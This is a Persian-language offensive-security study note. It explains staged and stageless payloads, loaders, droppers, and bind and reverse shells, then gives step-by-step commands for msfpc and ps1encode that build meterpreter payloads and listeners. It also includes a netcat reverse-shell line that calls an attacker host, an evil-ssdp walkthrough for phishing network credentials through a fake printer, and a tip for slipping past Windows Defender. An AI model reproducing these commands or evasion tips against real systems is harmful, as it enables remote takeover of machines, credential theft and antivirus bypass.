



### 1. Payload Stage (یا Staged Payload)

- **تعریف:**  
    payload 
    به چند بخش (stage) تقسیم می‌شود. ابتدا یک مرحله‌ی کوچک و سبک (Stage 1) ارسال می‌شود که معمولا کارش راه‌اندازی ارتباط بین مهاجم و هدف است. سپس مرحله یا مراحل بعدی payload که معمولا شامل کد اصلی و سنگین‌تر است، ارسال می‌شود.
    
- **مزایا:**
    
    - حجم اولیه‌ی payload کوچک است؛ راحت‌تر از فایروال‌ها و سیستم‌های IDS عبور می‌کند.
        
    - امکان کنترل بیشتر روی مراحل بعدی حمله.
        
    - انعطاف‌پذیری بالاتر.
        
- **معایب:**
    
    - نیازمند یک ارتباط قابل‌اعتماد بین مهاجم و قربانی برای دریافت مراحل بعدی است.
        
    - اگر مرحله‌ی اول شناسایی یا مسدود شود، کل حمله ناکام می‌ماند.
        
- **مثال:**  
    `windows/meterpreter/reverse_tcp` در متاسپلویت که ابتدا یک مرحله‌ی کوچکتر (stager) ارسال می‌کند و سپس مرحله‌ی کامل meterpreter را بارگذاری می‌کند.
    

---

### 2. Payload Stageless (یا Stageless Payload)

- **تعریف:**  
    کل payload (همان مرحله‌ی ابتدایی و کد اصلی) به صورت یکجا و بدون تقسیم‌بندی ارسال می‌شود.
    
- **مزایا:**
    
    - سرعت اجرای بالاتر چون نیازی به بارگذاری مرحله دوم نیست.
        
    - برای ارتباطات نامطمئن یا یک‌باره (مثلا در برخی حملات سریع) بهتر است.
        
- **معایب:**
    
    - حجم payload بزرگ‌تر است؛ ممکن است شناسایی و مسدود شدن توسط سیستم‌های امنیتی بیشتر باشد.
        
    - انعطاف‌پذیری کمتر.
        
- **مثال:**  
    `windows/meterpreter_reverse_tcp` stageless که کل meterpreter payload را در یک بسته می‌فرستد.



## Loader چیست و چرا Malware ها از آن استفاده می‌کنند؟

**Loader**
یک قطعه کد کوچک است که وظیفه اصلی آن بارگذاری (load) و اجرای کد مخرب (malware) دیگر است. به عبارت ساده، Loader مانند یک "دروازه" عمل می‌کند و کد اصلی بدافزار را وارد سیستم می‌کند.

**چرا Malware ها از Loader ها استفاده می‌کنند؟**

*   **پنهان‌کاری:** با استفاده از Loader، بدافزار اصلی پنهان می‌شود و تنها کد Loader در معرض دید قرار می‌گیرد. این امر تشخیص و ردیابی بدافزار را دشوارتر می‌کند.
*   **اجتناب از شناسایی:** Loader ها می‌توانند از تکنیک‌های مختلفی برای جلوگیری از شناسایی توسط آنتی‌ویروس‌ها و سیستم‌های امنیتی استفاده کنند.
*   **افزودن انعطاف‌پذیری:** Loader ها به بدافزار اجازه می‌دهند تا به راحتی با تغییر کد اصلی، قابلیت‌های جدیدی به دست آورد یا به سیستم‌های مختلف حمله کند.
*   **کاهش اندازه بدافزار:** با جدا کردن کد Loader از بدافزار اصلی، می‌توان حجم کلی بدافزار را کاهش داد و فرآیند انتشار آن را آسان‌تر کرد.

**مثال:**

فرض کنید یک بدافزار پیچیده دارید که شامل چندین فایل است. به جای بارگذاری مستقیم تمام فایل‌ها، می‌توانید از یک Loader برای بارگذاری فایل‌های اصلی بدافزار استفاده کنید. Loader، فایل‌های اصلی را از یک منبع خارجی (مانند اینترنت) دانلود می‌کند و سپس آن‌ها را در حافظه سیستم بارگذاری کرده و اجرا می‌کند. این کار باعث می‌شود که بدافزار اصلی پنهان باقی بماند و شناسایی آن دشوارتر شود.

به طور خلاصه، Loaderها ابزاری قدرتمند برای پنهان‌کاری و فریب سیستم‌های امنیتی هستند که توسط مهاجمان برای اجرای بدافزارها به کار می‌روند.


## تفاوت Loader و Dropper

هر دو Loader و Dropper در بدافزارها نقش مهمی در اجرای کد مخرب دارند، اما تفاوت‌های کلیدی بین آن‌ها وجود دارد:

**Loader:**

*   **وظیفه:** بارگذاری و اجرای کد مخرب (Payload) از یک منبع خارجی (مانند اینترنت، یک فایل مخفی در سیستم، یا یک حافظه جانبی).
*   **عملکرد:** Loader تنها مسئول دریافت کد اصلی و اجرای آن است.  خود Loader معمولاً Payload نیست.
*   **تمرکز:** بر اتصال به منبع داده و بارگذاری کد.
*   **مثال:**  فرض کنید یک فایل اجرایی (executable) کوچک دارید که وظیفه دانلود یک فایل اجرایی بزرگتر را بر عهده دارد. این فایل کوچک به عنوان یک Loader عمل می‌کند.

**Dropper:**

*   **وظیفه:**  به طور مستقیم کد مخرب (Payload) را روی سیستم هدف کپی می‌کند.
*   **عملکرد:** Dropper  کد مخرب را از یک منبع (مانند یک فایل مخفی، یک شبکه، یا یک حافظه جانبی) دریافت و در یک مکان معین در سیستم (مانند پوشه `C:\Windows\System32`) کپی می‌کند.  بعد از کپی شدن، Dropper ممکن است کد مخرب را اجرا کند یا به Loader منتقل کند.
*   **تمرکز:** بر انتقال و ذخیره کد مخرب در سیستم.
*   **مثال:** یک بدافزار ممکن است ابتدا یک فایل مخفی در پوشه  `C:\Windows\Temp` ایجاد کند و سپس  Dropper  کد مخرب اصلی را در آن فایل کپی کند.

**به زبان ساده:**

*   **Dropper:**  فایل مخرب را *می‌کپی* می‌کند.
*   **Loader:**  فایل مخرب را *دانلود* می‌کند و *اجرا* می‌کند.

**نکته مهم:**  گاهی اوقات، یک بدافزار می‌تواند هم به عنوان یک Dropper و هم به عنوان یک Loader عمل کند.  به عنوان مثال، یک فایل اجرایی می‌تواند ابتدا کد مخرب را کپی کند (Dropper) و سپس کد مخرب را اجرا کند (Loader).


---

### خلاصه تفاوت‌ها

|ویژگی|Staged Payload|Stageless Payload|
|---|---|---|
|ارسال|چند مرحله‌ای (مرحله‌بندی شده)|یک مرحله‌ای (یکجا)|
|حجم اولیه|کوچک|بزرگ‌تر|
|پیچیدگی|بالاتر (نیاز به مدیریت مراحل)|ساده‌تر|
|تطبیق‌پذیری|بیشتر|کمتر|
|احتمال شناسایی|کمتر|بیشتر|
|سرعت اجرا|کمی کندتر|سریع‌تر|

---


### MSFvenom payload Creator ( MSFPC)

```bash
msfpc (after enter set TYPE and IP)
msfpc (windows/apk/bash/linux/batch) 192.168.122.129 1234 (stage)
msfpc stageless cmd (windows/apk/bash/linux/batch) 192.168.122.129 1234 (stageless CMD)
msfpc stageless msf (windows/apk/bash/linux/batch) 192.168.122.129 1234 (stageless meterpreter)
use Run: msfconsole -q -r '/home/omid/windows-meterpreter-staged-reverse-tcp-443-exe.rc'
another shell enter : 
python2 -m simpleHTTPserver 8080  
 sesseion 1
 meterpreter >
```

### MSFPC for Windows
---
```bash
msfpc (after enter set TYPE and IP)
msfpc windows 192.168.122.129
use Run: msfconsole -q -r '/home/omid/windows-meterpreter-staged-reverse-tcp-443-exe.rc'
another shell enter : 
python2 -m simpleHTTPserver 8080  
  sesseion 1
  meterpreter >
```

### MSFPC for Android
---
```bash
msfpc apk 192.168.122.129 8959
use Run: msfconsole -q -r '/home/omid/android-meterpreter-staged-reverse-tcp-443-apk.rc'
another shell enter : 
python2 -m simpleHTTPserver 8080  
  sesseion 1
  meterpreter >
```

### MSFPC for Bash
---
```bash
msfpc bash 192.168.122.129 8959
use Run: msfconsole -q -r '/home/omid/bash-meterpreter-staged-reverse-tcp-443-sh.rc'
another shell enter : 
python2 -m simpleHTTPserver 8080  
  sesseion 1
  meterpreter >
```

### MSFPC for Linux
---
```bash
msfpc linux 192.168.122.129 8959
use Run: msfconsole -q -r '/home/omid/linux-meterpreter-staged-reverse-tcp-443-efl.rc'
another shell enter : 
python2 -m simpleHTTPserver 8080 
(in target server) :
./linux-meterpreter-staged-reverse-tcp-443-efl
  sesseion 1
  meterpreter >
```

### MSFPC in Python
---
```bash
msfpc python 192.168.122.129 8959
use Run: msfconsole -q -r '/home/omid/python-meterpreter-staged-reverse-tcp-443-py.rc'
another shell enter : 
python2 -m simpleHTTPserver 8080
(in target server) :
python3 python-meterpreter-staged-reverse-tcp-443-py
  sesseion 1
  meterpreter >
```

### MSFPC all Payload reverce shell

---
```bash
msfpc msf batch eth0 -----> ( all platforms reverse meterpreter sessions )
msfpc cmd bacth eth0 ----> ( all platforms reverse command shell )
```



## create payload with PS1endcode

> PS1endcode build by RUBY
> 
> payload is encrypt in this formats : 
> 
> raw (encoded payload only no powershell run options)
> 
> cmd (for use with bat files)
> 
> vba (for use with macro trojan docs)
> 
> vbs (for use with vbs scripts)
> 
> war (tomcat)
> 
> exe (executable) requires MinGW -x86_64-w64-mingw32-gcc [apt-get install mingw- w64]
> 
> java (for use with malicious java applets)
> 
> js (javascript)
> 
> js-rd32 (javascript called by rundll32.exe)
> 
> php (for use with php pages)
> 
> hta (HTML applications)
> 
> cfm (for use with Adobe ColdFusion)
> 
> aspx (for use with Microsoft ASP.NET)
> 
> • Ink (windows shortcut - requires a webserver to stage the payload) sct (COM scriptlet - requires a webserver to stage the payload)
> 

---
```bash
./ps1encode.rb --LHOST 192.168.141.141 --LPORT 8989 --PAYLOAD windows/meterpreter/reverse_tcp --ENCODE hta
python2 -m simpleHTTPserver 8080
msfdb start
msfconsole
use exploit/multi/handler
set Lhost 192.168.141.141
set Port 8989
set windows/meterpreter/reverse_tcp
exploit
```

### 1. Bind Shell

- **چطور کار می‌کند؟**  
    در این حالت، **سیستم هدف** روی خودش یک سرویس (shell) باز می‌کند و منتظر می‌ماند که مهاجم به آن وصل شود. یعنی سیستم هدف روی یک پورت خاص گوش می‌دهد (listening) و مهاجم به آن متصل می‌شود.
    
- **روند کلی:**
    
    1. سیستم هدف روی پورت مشخصی باز می‌کند (مثلاً پورت 4444).
        
    2. مهاجم به آن پورت متصل می‌شود و کنترل shell را می‌گیرد.
        
- **مزایا:**
    
    - ساده برای اجرا.
        
    - مهاجم مستقیم به سیستم هدف وصل می‌شود.
        
- **معایب:**
    
    - در سیستم‌های پشت فایروال یا NAT، پورت باز روی سیستم هدف ممکن است بسته یا مسدود باشد.
        
    - آدرس و پورت هدف باید در دسترس مهاجم باشد.
        

---

### 2. Reverse Shell

- **چطور کار می‌کند؟**  
    در این حالت، **سیستم هدف** خودش به مهاجم متصل می‌شود و یک کانال ارتباطی برقرار می‌کند. یعنی مهاجم منتظر است روی یک پورت مشخص گوش کند (listening) و سیستم هدف به آن وصل می‌شود.
    
- **روند کلی:**
    
    1. مهاجم روی پورت مشخصی گوش می‌دهد (مثلاً پورت 4444).
        
    2. سیستم هدف به آن پورت مهاجم متصل می‌شود و مهاجم کنترل shell را به دست می‌آورد.
        
- **مزایا:**
    
    - بهتر برای نفوذ به سیستم‌های پشت NAT یا فایروال، چون سیستم هدف خودش اتصال را ایجاد می‌کند.
        
    - کمتر توسط فایروال‌ها مسدود می‌شود (چون اتصال از داخل شبکه به بیرون است).
        
- **معایب:**
    
    - نیاز به اینکه مهاجم بتواند روی یک پورت منتظر بماند.
        
    - گاهی نیاز به تنظیمات روی مهاجم برای پذیرش اتصال.
        

---

### مقایسه خلاصه

|ویژگی|Bind Shell|Reverse Shell|
|---|---|---|
|سمت Listener|سیستم هدف (Target)|مهاجم (Attacker)|
|سمت Connector|مهاجم (Attacker)|سیستم هدف (Target)|
|مناسب برای|شبکه‌های بدون فایروال یا NAT|سیستم‌های پشت فایروال یا NAT|
|مشکل اصلی|پورت باز روی هدف ممکن است مسدود باشد|مهاجم باید آماده دریافت اتصال باشد|

---

### مثال ساده:

- **Bind Shell:**  
    سیستم هدف روی پورت 4444 گوش می‌دهد:  
    `nc -lvp 4444`  
    مهاجم به آن وصل می‌شود:  
    `nc <target-ip> 4444`
    
- **Reverse Shell:**  
    مهاجم گوش می‌دهد:  
    `nc -lvp 4444`  
    سیستم هدف به مهاجم وصل می‌شود:  
    `nc <attacker-ip> 4444 -e /bin/bash`
    

---

### SSDP & UPnP protocol :
۱ - پروتکل **SSDP** یا Simple Service Discovery Protocol توسط انجمن جهانی **UPnP** (مخفف Universal Plug and Play) برای ایجاد ارتباط و کشف دستگاه‌های مختلف تحت شبکه، ارائه شده است. **SSDP** به دستگاه‌های مختلف کمک می‌کند بتوانند خدمات خود را به سایر دستگاه‌ها در شبکه خود معرفی کنند تا به‌طور خودکار و با کمی تلاش، توسط کاربر یافته شوند.

پروتکل upnp که مخفف Universal plug and play هست به دستگاه‌هایی مانند پرینترها، تلفن همراه، اکسس‌پوینت‌های Wifi، کامپیوترهای شخصی و چیزایی مثل این اجازه‌‌ می‌ده که همدیگه رو برای اشتراک‌گذاری داده‌ها کشف کنند. خب اگه بخوایم ساده‌تر بگیم upnp به دستگاه‌هایی که ازشون پشتیبانی می‌کنه اجازه‌ می‌ده که به‌صورت خودکار همدیگه رو پیدا کنند.

۲- upnp مجموعه‌ای از پروتکل‌های وب و شبکه هست که از پروتکل‌های زیادی مثل XML,Html,UDP تشکیل‌شده.upnp معمولاً برای شبکه‌های ساده و خونگی استفاده ‌می‌شه؛ پس خیلی چیز پیچیده‌ای نیست. کارایی upnp مثل یک پرینتر و یا کابل USB هست.

```bash
apt install evil-ssdp
/usr/share/evil-ssdp/templates
cve-2018-13417
evil-ssdp -t scanner eth0 -u https://www.office.com/
evil-ssdp -t office365 eth0
evil-ssdp eth0 -t microsoft-azure
evil-ssdp eth0 -t bitcoin
```



```shell
evil-ssdp -t scanner eth0 -u https://www.office.com/
```

با استفاده از این دستور ما داریم میگیم که داخل اون شبکه برو یه سیستمی به نام scanner راه بنداز که کاربرانی که بهش وصل شده اند بیان و هدایت شن به سایتی که گفتیم 

![[Pasted image 20260111014115.png]]

الان اگر کاربران در شبکه یعنی در thisPC کلیک کنن و اگر در بخش network بیان 

![[Pasted image 20260111014201.png]]

اون سیستمی که نوشته شده scanner در اصل سیستم ما هستش که در سیستم های دیگر که در سطح اون شبکه هستند سیستم من رو به شکل یک پرینتر میبینن اینکار از طریق همین پروتوکل SSDP انجام میشود 

![[Pasted image 20260111014402.png]]

به محض اینکه روش کلیک کنید از ما user و pass میخواد و اگر کاربر اطلاعات ورودی سیستمش رو بده 

![[Pasted image 20260111014448.png]]

ما اینطرف میبینیم و میتونیم با استفاده از پروتوکل های ماننده smb,psreamoting,winrs,rdp,ftp,ssh و سایر سرویس هایی که در سیستم هدف باز باشند بهش وصل شویم 

مثلا میتونیم با ابزار rpcclient بهش وصل شویم

![[Pasted image 20260111014650.png]]


---


بریم برای یکی دیگه از ابزار هایی که در ساخت becon استفاده میشه.
## psencode 

یکی از ابزار هایی که با زبان ruby نوشته شده و به ما این امکان رو میده تا بیایم و با توجه هدفهمون و فرمتی که مد نظرمون هست agent مون رو درست کنیم 


- download --->  [linktool](github.com/CroweCybersecurity/ps1encode/blob/master/ps1encode.rb)
بعد از اینکه ابزار رو نصب کردین و پرمیشن رو دادین بهش خیلی راحت میتونینن اجرا کنینش

![[Pasted image 20260111004757.png]]

```shell
Usage: ps1encode. rb -- LHOST [default = 127.0.0.1] -- LPORT [default = 443] -- PAYLOAD [default = windows/meterpreter/reverse_https] -ENCODE [default = cmd] -- 32bitexe

-i, -LHOST VALUE
-p, -- LPORT VALUE
-- 32bitexe
-a, -- PAYLOAD VALUE
-t, -- ENCODE VALUE

Local host IP address
Local host port number
Force 32 bit EXE
Payload to use
Output format: raw, cmd, vba, vbs, war, exe, java, js, js-rd32, php, hta, cfm, aspx, lnk, sct
```


- format
     - cmd
     - raw
     - vba
     - vbs
     - war
     - java
     - hta
     - exe
 - payload
     - reverse 
         - meterpreter
         - other
     - bind
         - nc


این هم مثله سایر ابزار ها میایم payload مون رو درست میکنیم مثلا cmd میگیریم و میریم که اون ور اجرا کنیم 

![[Pasted image 20260111005212.png]]

بعد از اینکه payload رو برای ما ساخت میتونیم بریم داخل سیستم هدف اجرا کنیم 

## __نکته کنکوری__

زمانی که میخواهید دستور رو بزنید به جای اینکه بیاید یه batch فایل درست کنید بیاید یه cmd اجرا کنید و در قدم بعدی command رو کپی پیست کنید رو سیستم هدف چرا چون با این روش defender رو هم بایپس میکنید

![[Pasted image 20260111005448.png]]

همونطور که در تصویر میبینید  به محض اینکه کامند رو پیست میکنیم defender صداش در میاد اما ....


![[bypass_defendermp4.mp4]]


## نکته : 

![[Pasted image 20260111012551.png]]

همونطور که در تصویر بالا میبینید وقتی روی فایل دابل کلیک میکنید و یا اصلا از طریق پاوشل اجراش میکنید یه همچین صفحه یی میادش بالا که تایید بگیره از اینو چطوری بایپس کنیم 

با استفاده از ابزار wget اگر فایل رو دانلود کنیم خودش میاد مستقیم ران هم میکنه 


![[Pasted image 20260111012747.png]]

![[Pasted image 20260111012756.png]]

![[Screen Recording 2026-01-11 013058.mp4]]


وقتی با wget بزنیم بهمون این اپشن رو میده که اون yes یا no اجرا بشه یا نه 

![[Pasted image 20260111013332.png]]


---


## بعضی از مودم های TP-Link 8 تا کاراکتر به صورت دیفالت پسوردشونه

که با ابزار crunch میتونیم این wordlist رو بسازیم 

